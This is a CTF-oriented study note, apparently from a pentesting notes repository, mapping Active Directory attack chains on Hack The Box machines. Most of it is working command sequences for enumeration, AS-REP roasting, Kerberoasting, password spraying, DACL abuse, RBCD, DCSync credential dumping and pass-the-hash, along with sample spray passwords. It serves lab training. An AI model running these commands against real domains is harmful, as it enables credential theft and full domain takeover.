# AD Attack Chains

> The single most-demonstrated content category on the IppSec channel.
> Active Directory chains are 3-to-6-step sequences combining: anonymous
> enumeration → username discovery → password acquisition → privilege
> escalation → DA → DCSync.

## The canonical AD chain (template)

```
nmap → AD detected (88+389+445)
  ↓
anonymous LDAP / RPC / SMB → user list (or domain info)
  ↓
either:
  • Kerbrute userenum (when other channels dry)
  • LDAP filtering for accounts with "Do not require pre-auth"
  ↓
AS-REPRoasting (impacket-GetNPUsers) → hash → hashcat → cleartext
  ↓
authenticated LDAP / SMB enum (BloodHound!)
  ↓
identify privesc edge in BloodHound
  ↓
exploit edge: Kerberoast, ACL abuse, RBCD, GenericAll, etc.
  ↓
DCSync → hashes for every user including krbtgt
  ↓
Pass-the-hash as administrator → DA shell
```

Every IppSec AD box matches some subset of this template. Memorise the
template; recognising which steps are skipped is faster than re-inventing
the chain each time.

## Phase 0: Detect AD

The "AD smell test" from nmap output:
- **88/tcp Kerberos** — almost-definitive.
- **389/tcp LDAP** — mandatory.
- **636/tcp LDAPS** — TLS LDAP.
- **3268/tcp Global Catalog** — strong indicator (only DCs run GC).
- **445/tcp SMB** with hostnames in the cert.
- **53/tcp DNS** — DCs typically run DNS for the realm.

The realm name comes from:
- nmap `ldap-rootdse` script (`-sV -sC` includes it).
- TLS certificate subjects.
- SMB session setup negotiation.

Add it to `/etc/hosts` and update `/etc/resolv.conf` (or use `--dns-server`
on commands) to point at the DC. Many AD tools fail without working DNS.

## Phase 1: Anonymous enumeration

```bash
# LDAP — base info, then user/group queries
ldapsearch -x -H ldap://<ip> -s base namingcontexts
ldapsearch -x -H ldap://<ip> -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName description
ldapsearch -x -H ldap://<ip> -b "DC=htb,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
# Last query = "users with DONT_REQUIRE_PREAUTH" — direct AS-REP candidates

# RPC null session
rpcclient -U "" -N <ip> <<EOF
srvinfo
enumdomusers
querydispinfo
getdompwinfo
EOF

# SMB
smbmap -H <ip> -u '' -p ''
smbclient -L //<ip>/ -N

# Combined
enum4linux-ng -A <ip>
```

The Forest box pattern: anonymous LDAP returns the user list including a
service account `svc-alfresco` flagged for AS-REP.

## Phase 2: Generate / refine the userlist

Sources, in order of value:
1. LDAP enumeration (cheapest, most accurate).
2. RPC `enumdomusers`.
3. Kerberos username brute (`kerbrute userenum`) — works even when LDAP/RPC
   are restricted; matches the Sauna pattern.
4. Web-scraping the public site for names (Sauna again — names from the
   "Our Team" page).
5. SMB shares for files with author metadata.

Username conversion:
- Real names from a website → `flast`, `firstlast`, `f.last`, `lastf`,
  `first.last` heuristics. The IppSec username generator script (or
  `username-anarchy`) does this.

```bash
# username-anarchy
git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy -i names.txt > users.txt

# kerbrute
./kerbrute userenum --dc <dc-ip> -d <domain> users.txt
```

## Phase 3: AS-REP roasting

Targets users with `DONT_REQUIRE_PREAUTH` enabled. You can request a TGT
without the preauth dance; the response includes a hash you can crack.

```bash
# from a single user
impacket-GetNPUsers <domain>/<user> -no-pass -dc-ip <ip>

# bulk against a list
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <ip> -format hashcat -outputfile asrep.hashes

# crack
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

Notes:
- Mode `18200` for Hashcat AS-REP.
- The `-format hashcat` flag matters; defaults differ by version.
- AS-REP is *unauthenticated* — works even when you have nothing.

## Phase 4: Password spraying

When you have a userlist but no creds:

```bash
# kerbrute is the right tool — uses Kerberos pre-auth, not SMB, so doesn't
# trigger the same lockout policy
./kerbrute passwordspray --dc <ip> -d <domain> users.txt 'Welcome1!'

# crackmapexec — louder, but tries SMB
crackmapexec smb <ip> -u users.txt -p 'Spring2024!' --continue-on-success
```

Sane spray candidates:
- `<Season><Year>!` (`Spring2024!`)
- `<Company>123!`
- `Welcome1`, `Password1`, `Changeme123`
- The company name from the website
- Anything from Sherlocks-style lists

**Always check lockout policy first** (`getdompwinfo` over RPC null). Spray
inside the threshold (one attempt per user per period).

## Phase 5: Authenticated enumeration — BloodHound

This is the IppSec-trademark step. Once you have *any* domain credential:

```bash
# from Linux
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc-ip> -c All
# produces .json files

# load into BloodHound GUI
neo4j start
bloodhound

# from Windows
.\SharpHound.exe -c All
```

Pre-built queries to run immediately:
- "Find Shortest Paths to Domain Admins"
- "Find Principals with DCSync Rights"
- "Find Computers where Domain Users are Local Admin"
- "Shortest Path from Owned Principals" (after marking your user)

Edges to look for:
- `MemberOf` (transitive group membership)
- `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `Owns`
- `AddMember`, `AddSelf` (group abuse)
- `ForceChangePassword`, `AddKeyCredentialLink`
- `AllowedToDelegate`, `AllowedToActOnBehalfOfOtherIdentity` (RBCD)

## Phase 6: Privilege escalation primitives

### Kerberoasting
Service accounts (have an SPN) → request a TGS, crack offline.
```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <ip> -request -outputfile kerberoast.hashes
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```
Active box pattern: `svc_tgs` is kerberoastable; password is `GPPstillStandingStrong2k18`.

### GenericAll / GenericWrite on a user
Reset password or set SPN.
```bash
# reset password
net rpc password "<target>" "NewPass1!" -U "<domain>\\<user>%<pass>" -S <dc-ip>

# add SPN, then kerberoast (Targeted Kerberoasting)
impacket-addspn -u <user> -p '<pass>' -t <target> 'fake/spn' <dc-ip>
```

### WriteDACL on a domain object → DCSync
The Forest pattern. With WriteDACL on the domain, grant your user
`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, then
DCSync.
```bash
impacket-dacledit -action 'write' \
  -rights 'DCSync' -principal <user> \
  -target-dn '<domain-dn>' \
  '<domain>/<user>:<pass>'
impacket-secretsdump <domain>/<user>:<pass>@<dc-ip>
```
Or via PowerView (Windows side):
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity <user> -Rights DCSync
```

### Resource-Based Constrained Delegation (RBCD)
When your user has `WriteProperty` (or general write access) on a computer
object:
```bash
impacket-rbcd -delegate-from <fake-machine$> -delegate-to <victim$> -action 'write' '<domain>/<user>:<pass>'
impacket-getST -spn 'cifs/<victim>' -impersonate <admin-user> '<domain>/<fake-machine$>:<password>'
```

### AS-REP / Kerberoast follow-on
Often these primitives chain: kerberoast a service account → its password
reuses the local admin → use it for DCSync.

## Phase 7: DCSync → DA

```bash
impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<pass>@<dc-ip>
# or full
impacket-secretsdump <domain>/<user>:<pass>@<dc-ip>

# then pass-the-hash as administrator
impacket-psexec -hashes :<NTLM> <domain>/Administrator@<dc-ip>
evil-winrm -i <dc-ip> -u Administrator -H <NTLM>
```

## AD-specific common mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Wrong system clock | `KRB_AP_ERR_SKEW` | `sudo ntpdate <dc-ip>` or use `faketime` |
| Wrong DNS | Tools can't find DC | Add DC to `/etc/resolv.conf`; use FQDN |
| Wrong realm casing | Kerberos ticket fails | Use exact realm; usually UPPERCASE |
| Missing domain in tools | "STATUS_LOGON_FAILURE" | Use `<domain>/<user>` not just `<user>` |
| Account lockout from spray | Spray dies after N attempts | Check policy first; throttle |
| Treating BloodHound output as truth | Edges that aren't exploitable | Cross-check with manual `Get-DomainObjectAcl` |

## Real HTB examples

- **Forest** — anon LDAP → AS-REP `svc-alfresco` → BloodHound shows
  Exchange Trusted Subsystem WriteDACL on domain → DCSync.
- **Sauna** — site-scraping → kerbrute → AS-REP → on-host
  registry autologon → DCSync.
- **Active** — null SMB → `Groups.xml` GPP cpassword → SVC_TGS account →
  Kerberoast administrator → DA.
- **Cascade** — anonymous LDAP → SMB shares (`Audit$`) → custom .NET
  decryption → AD recycle bin → administrator.
- **Resolute, Mantis, Sizzle, Reel, Sniper, Cascade, Multimaster, Fuse,
  Outdated, Authority, …** — all variants on the same template.

## See also

- [09-credential-hunting.md](09-credential-hunting.md)
- [10-lateral-movement.md](10-lateral-movement.md)
- [../active-directory/](../active-directory/)
- [../password-attacks/](../password-attacks/)
